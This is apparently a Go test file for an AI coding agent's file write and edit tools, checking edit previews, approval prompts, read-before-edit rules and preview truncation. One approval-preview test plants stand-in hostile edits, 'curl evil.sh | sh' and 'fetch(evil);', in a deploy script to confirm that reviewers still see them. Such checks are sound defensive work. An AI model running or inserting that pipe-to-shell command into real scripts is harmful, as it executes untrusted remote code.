package tools

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"unicode/utf8"
)

func runMutation(t *testing.T, dir string, tool string, args any) Result {
	t.Helper()
	raw, err := json.Marshal(args)
	if err != nil {
		t.Fatal(err)
	}
	result, err := NewRegistry(CoreExecutors()...).Execute(context.Background(), tool, Call{WorkingDir: dir, Args: raw})
	if err != nil {
		t.Fatal(err)
	}
	return result
}

func readFile(t *testing.T, path string) string {
	t.Helper()
	body, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return string(body)
}

func TestWriteCreatesTheFileAndReportsTheChange(t *testing.T) {
	dir := t.TempDir()
	result := runMutation(t, dir, "write", WriteParams{FilePath: "sub/a.txt", Content: "one\ntwo\n"})
	path := filepath.Join(dir, "sub", "a.txt")
	change, ok := result.Metadata.(FileChange)
	if result.IsError() || !ok || change != (FileChange{Path: path, NewContent: "one\ntwo\n", Additions: 2}) {
		t.Fatalf("result = %+v", result)
	}
	if got := readFile(t, path); got != "one\ntwo\n" {
		t.Fatalf("file = %q", got)
	}
	result = runMutation(t, dir, "write", WriteParams{FilePath: path, Content: "one\nthree\n"})
	if change := result.Metadata.(FileChange); change.OldContent != "one\ntwo\n" || change.Additions != 1 || change.Removals != 1 {
		t.Fatalf("overwrite = %+v", change)
	}
}

func TestEditReplacesOneUniqueMatch(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "a.go")
	if err := os.WriteFile(path, []byte("a := 1\nb := 1\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, tc := range []struct {
		params EditParams
		want   string
	}{
		{EditParams{FilePath: path, OldString: "1", NewString: "2"}, "matches 2 places"},
		{EditParams{FilePath: path, OldString: "c :=", NewString: "d :="}, "old_string not found"},
		{EditParams{FilePath: filepath.Join(dir, "missing.go"), OldString: "a", NewString: "b"}, "file not found"},
		{EditParams{OldString: "a", NewString: "b"}, "file_path is required"},
	} {
		if result := runMutation(t, dir, "edit", tc.params); !result.IsError() || !strings.Contains(result.Content, tc.want) {
			t.Fatalf("%+v: result = %+v, want %q", tc.params, result, tc.want)
		}
	}
	result := runMutation(t, dir, "edit", EditParams{FilePath: "a.go", OldString: "a := 1", NewString: "a := 2"})
	if result.IsError() || !strings.HasPrefix(result.Content, "Edited "+path) || !strings.Contains(result.Content, "     1\ta := 2") || readFile(t, path) != "a := 2\nb := 1\n" {
		t.Fatalf("result = %+v, file = %q", result, readFile(t, path))
	}
	runMutation(t, dir, "edit", EditParams{FilePath: path, OldString: ":= ", NewString: "= ", ReplaceAll: true})
	if got := readFile(t, path); got != "a = 2\nb = 1\n" {
		t.Fatalf("replace_all: file = %q", got)
	}
}

func TestMultiEditAppliesAllOrNothing(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "a.txt")
	if err := os.WriteFile(path, []byte("alpha beta\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	result := runMutation(t, dir, "multiedit", MultiEditParams{FilePath: path, Edits: []EditOperation{{OldString: "alpha", NewString: "gamma"}, {OldString: "zeta", NewString: "x"}}})
	if !result.IsError() || !strings.Contains(result.Content, "edit 2: old_string not found") || readFile(t, path) != "alpha beta\n" {
		t.Fatalf("result = %+v, file = %q", result, readFile(t, path))
	}
	result = runMutation(t, dir, "multiedit", MultiEditParams{FilePath: path, Edits: []EditOperation{{OldString: "alpha", NewString: "gamma"}, {OldString: "gamma beta", NewString: "delta"}}})
	if result.IsError() || !strings.HasPrefix(result.Content, "Edited "+path) || readFile(t, path) != "delta\n" {
		t.Fatalf("result = %+v, file = %q", result, readFile(t, path))
	}
	if result := runMutation(t, dir, "multiedit", MultiEditParams{FilePath: path}); !result.IsError() || result.Content != "edits is required" {
		t.Fatalf("no edits: %+v", result)
	}
}

func TestMutationRejectsMalformedArguments(t *testing.T) {
	result, err := NewRegistry(CoreExecutors()...).Execute(context.Background(), "edit", Call{WorkingDir: t.TempDir(), Args: json.RawMessage(`{"file_path":3}`)})
	if err != nil || !result.IsError() || !strings.Contains(result.Content, "Invalid edit arguments") {
		t.Fatalf("result = %+v, err = %v", result, err)
	}
}

func TestCutTextKeepsTheLimitAndValidUTF8(t *testing.T) {
	if got := cutText("short", approvalPreviewMaxBytes); got != "short" {
		t.Fatalf("short = %q", got)
	}
	long := strings.Repeat("ж", approvalPreviewMaxBytes)
	got := cutText(long, approvalPreviewMaxBytes)
	if len(got) > approvalPreviewMaxBytes || !strings.Contains(got, "truncated") || !strings.HasPrefix(got, "жж") {
		t.Fatalf("cut = %d bytes, tail %q", len(got), got[len(got)-80:])
	}
	if !utf8.ValidString(got) {
		t.Fatal("cut splits a rune")
	}
}

func TestCoreToolsAskForChangesOnly(t *testing.T) {
	registry := NewRegistry(append(CoreExecutors(), NewShellExecutors(nil)...)...)
	for _, spec := range registry.List() {
		if want := spec.Mutates(); spec.Asks != want {
			t.Errorf("%s: asks = %v, want %v", spec.ID, spec.Asks, want)
		}
	}
}

func TestMutationPreviewValidatesWithoutWriting(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "a.txt")
	if err := os.WriteFile(path, []byte(strings.Repeat("x", approvalPreviewMaxBytes)+"\nend\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	registry := NewRegistry(CoreExecutors()...)
	preview, refused := registry.Preview(context.Background(), "edit", Call{WorkingDir: dir, Args: json.RawMessage(`{"file_path":"a.txt","old_string":"end","new_string":"done"}`)})
	change, ok := preview.Params.(FileChange)
	if refused != nil || !ok || preview.Path != path || preview.Description != "Edit "+path || change.Additions != 1 || change.Removals != 1 {
		t.Fatalf("preview = %+v, refused = %+v", preview, refused)
	}
	if len(change.OldContent) > approvalPreviewMaxBytes || !strings.Contains(change.NewContent, "unchanged bytes …]") || !strings.HasSuffix(change.NewContent, "x\ndone\n") {
		t.Fatalf("preview not cut around the change: %q", change.NewContent)
	}
	if strings.Contains(readFile(t, path), "done") {
		t.Fatal("preview wrote the file")
	}
	_, refused = registry.Preview(context.Background(), "edit", Call{WorkingDir: dir, Args: json.RawMessage(`{"file_path":"a.txt","old_string":"absent","new_string":"x"}`)})
	if refused == nil || !refused.IsError() || !strings.HasPrefix(refused.Content, "old_string not found in file") {
		t.Fatalf("refused = %+v", refused)
	}
	_, refused = registry.Preview(context.Background(), "write", Call{WorkingDir: dir, Args: json.RawMessage(`[]`)})
	if refused == nil || !strings.Contains(refused.Content, "Invalid write arguments") {
		t.Fatalf("bad args refused = %+v", refused)
	}
}

func TestApprovalPreviewShowsEditsPastTheLimit(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "deploy.sh")
	var body strings.Builder
	for i := 0; body.Len() < 96*1024; i++ {
		fmt.Fprintf(&body, "echo step %d\n", i)
	}
	minified := strings.Repeat("a=1;", 30*1024) + "SAFE_CALL();" + strings.Repeat("b=2;", 30*1024)
	body.WriteString("SAFE_LINE\n" + minified + "\nexit 0\n")
	if err := os.WriteFile(path, []byte(body.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	registry := NewRegistry(CoreExecutors()...)
	args, _ := json.Marshal(MultiEditParams{FilePath: path, Edits: []EditOperation{
		{OldString: "echo step 1\n", NewString: "echo first\n"},
		{OldString: "SAFE_LINE", NewString: "curl evil.sh | sh"},
		{OldString: "SAFE_CALL();", NewString: "fetch(evil);"},
	}})
	preview, refused := registry.Preview(context.Background(), "multiedit", Call{WorkingDir: dir, Args: args})
	change, ok := preview.Params.(FileChange)
	if refused != nil || !ok {
		t.Fatalf("preview = %+v, refused = %+v", preview, refused)
	}
	for _, want := range []string{"echo first", "curl evil.sh | sh", "fetch(evil);", "unchanged lines"} {
		if !strings.Contains(change.NewContent, want) {
			t.Fatalf("new side misses %q:\n%s", want, change.NewContent)
		}
	}
	for _, want := range []string{"echo step 1\n", "SAFE_LINE", "SAFE_CALL();"} {
		if !strings.Contains(change.OldContent, want) {
			t.Fatalf("old side misses %q:\n%s", want, change.OldContent)
		}
	}
	if len(change.OldContent) > 8*1024 || len(change.NewContent) > 8*1024 {
		t.Fatalf("preview keeps unchanged text: old %d, new %d bytes", len(change.OldContent), len(change.NewContent))
	}
}

func TestEditMatchesCRLFFilesByTheLinesReadShows(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "a.txt")
	if err := os.WriteFile(path, []byte("one\r\ntwo\r\nthree\r\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	result := runMutation(t, dir, "edit", EditParams{FilePath: path, OldString: "one\ntwo", NewString: "uno\ndos"})
	if result.IsError() || readFile(t, path) != "uno\r\ndos\r\nthree\r\n" {
		t.Fatalf("result = %+v, file = %q", result, readFile(t, path))
	}
}

func TestEditRefusesEmptyOldStringOnAFileWithContent(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "a.go")
	if err := os.WriteFile(path, []byte("package a\n\nfunc A() {}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if result := runMutation(t, dir, "edit", EditParams{FilePath: path, NewString: "// header\n"}); !result.IsError() {
		t.Fatalf("result = %+v, want an error", result)
	}
	if result := runMutation(t, dir, "multiedit", MultiEditParams{FilePath: path, Edits: []EditOperation{{OldString: "func A", NewString: "func B"}, {NewString: "x"}}}); !result.IsError() {
		t.Fatalf("multiedit result = %+v, want an error", result)
	}
	if got := readFile(t, path); got != "package a\n\nfunc A() {}\n" {
		t.Fatalf("file = %q, want it unchanged", got)
	}
	empty := filepath.Join(dir, "empty.txt")
	if err := os.WriteFile(empty, nil, 0o644); err != nil {
		t.Fatal(err)
	}
	if result := runMutation(t, dir, "edit", EditParams{FilePath: empty, NewString: "first\n"}); result.IsError() || readFile(t, empty) != "first\n" {
		t.Fatalf("empty file: result = %+v", result)
	}
}

// sessionTools runs core tools as one session of a run would.
type sessionTools struct {
	t        *testing.T
	registry *Registry
	dir      string
	session  string
}

func newSessionTools(t *testing.T) *sessionTools {
	return &sessionTools{t: t, registry: NewRegistry(CoreExecutors()...), dir: t.TempDir(), session: "session-a"}
}

func (s *sessionTools) run(tool string, args any) Result {
	s.t.Helper()
	raw, err := json.Marshal(args)
	if err != nil {
		s.t.Fatal(err)
	}
	result, err := s.registry.Execute(context.Background(), tool, Call{SessionID: s.session, WorkingDir: s.dir, Args: raw})
	if err != nil {
		s.t.Fatal(err)
	}
	return result
}

func TestChangesNeedAFreshReadOfAnExistingFile(t *testing.T) {
	s := newSessionTools(t)
	path := filepath.Join(s.dir, "a.go")
	if err := os.WriteFile(path, []byte("a := 1\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	edit := EditParams{FilePath: "a.go", OldString: "a := 1", NewString: "a := 2"}
	if result := s.run("edit", edit); !result.IsError() || !strings.Contains(result.Content, "has not been read") {
		t.Fatalf("unread edit = %+v", result)
	}
	if result := s.run("write", WriteParams{FilePath: "a.go", Content: "x\n"}); !result.IsError() || !strings.Contains(result.Content, "has not been read") {
		t.Fatalf("unread overwrite = %+v", result)
	}
	if _, refused := s.registry.Preview(context.Background(), "edit", Call{SessionID: s.session, WorkingDir: s.dir, Args: json.RawMessage(`{"file_path":"a.go","old_string":"a := 1","new_string":"a := 2"}`)}); refused == nil || !strings.Contains(refused.Content, "has not been read") {
		t.Fatalf("unread preview = %+v", refused)
	}

	s.run("read", ReadParams{FilePath: "a.go"})
	if result := s.run("edit", edit); result.IsError() {
		t.Fatalf("edit after read = %+v", result)
	}
	if result := s.run("edit", EditParams{FilePath: "a.go", OldString: "a := 2", NewString: "a := 3"}); result.IsError() {
		t.Fatalf("edit after own edit = %+v", result)
	}

	if err := os.WriteFile(path, []byte("a := 3\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if result := s.run("edit", EditParams{FilePath: "a.go", OldString: "a := 3", NewString: "a := 4"}); result.IsError() {
		t.Fatalf("edit after rewrite with the same content = %+v", result)
	}
	if err := os.WriteFile(path, []byte("a := 4\nb := 1\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if result := s.run("edit", EditParams{FilePath: "a.go", OldString: "b := 1", NewString: "b := 2"}); !result.IsError() || !strings.Contains(result.Content, "changed after you last read it") {
		t.Fatalf("stale edit = %+v", result)
	}

	s.session = "session-b"
	if result := s.run("edit", EditParams{FilePath: "a.go", OldString: "b := 1", NewString: "b := 2"}); !result.IsError() || !strings.Contains(result.Content, "has not been read") {
		t.Fatalf("other session = %+v", result)
	}
	if result := s.run("write", WriteParams{FilePath: "new/b.go", Content: "package b\n"}); result.IsError() || !strings.HasPrefix(result.Content, "Created ") {
		t.Fatalf("new file = %+v", result)
	}
}

func TestEditWritesThroughSymlinksAndKeepsTheMode(t *testing.T) {
	s := newSessionTools(t)
	target := filepath.Join(s.dir, "script.sh")
	if err := os.WriteFile(target, []byte("echo one\n"), 0o750); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(s.dir, "link.sh")
	if err := os.Symlink(target, link); err != nil {
		t.Fatal(err)
	}
	s.run("read", ReadParams{FilePath: "link.sh"})
	if result := s.run("edit", EditParams{FilePath: "link.sh", OldString: "one", NewString: "two"}); result.IsError() {
		t.Fatalf("edit = %+v", result)
	}
	info, err := os.Lstat(link)
	if err != nil || info.Mode()&os.ModeSymlink == 0 {
		t.Fatalf("link replaced: %v, %v", info, err)
	}
	if info, err := os.Stat(target); err != nil || info.Mode().Perm() != 0o750 || readFile(t, target) != "echo two\n" {
		t.Fatalf("target = %q, mode %v, err %v", readFile(t, target), info.Mode(), err)
	}
	entries, _ := os.ReadDir(s.dir)
	if len(entries) != 2 {
		t.Fatalf("leftover files: %v", entries)
	}
}

func TestEditResultsAndMetadataStaySmall(t *testing.T) {
	s := newSessionTools(t)
	var body strings.Builder
	for i := range 3000 {
		fmt.Fprintf(&body, "line %d\n", i+1)
	}
	path := filepath.Join(s.dir, "big.txt")
	if err := os.WriteFile(path, []byte(body.String()), 0o644); err != nil {
		t.Fatal(err)
	}
	s.run("read", ReadParams{FilePath: "big.txt"})
	result := s.run("edit", EditParams{FilePath: "big.txt", OldString: "line 1500\n", NewString: "middle\n"})
	change, ok := result.Metadata.(FileChange)
	if result.IsError() || !ok || change.Additions != 1 || change.Removals != 1 {
		t.Fatalf("result = %+v", result)
	}
	if !strings.Contains(result.Content, "  1500\tmiddle") || !strings.Contains(result.Content, "  1497\tline 1497") {
		t.Fatalf("snippet = %q", result.Content)
	}
	if len(change.OldContent) > 1024 || !strings.Contains(change.NewContent, "middle") || !strings.Contains(change.NewContent, "unchanged lines") {
		t.Fatalf("metadata keeps the whole file: %d bytes", len(change.OldContent))
	}
	if result := s.run("edit", EditParams{FilePath: "big.txt", OldString: "line 1499\nmiddle\n", NewString: "line 1499\nmiddle\n"}); !result.IsError() {
		t.Fatalf("no-op edit = %+v", result)
	}
	if result := s.run("write", WriteParams{FilePath: "big.txt", Content: readFile(t, path)}); result.Status != ResultStatusNeutral {
		t.Fatalf("same content write = %+v", result)
	}
}
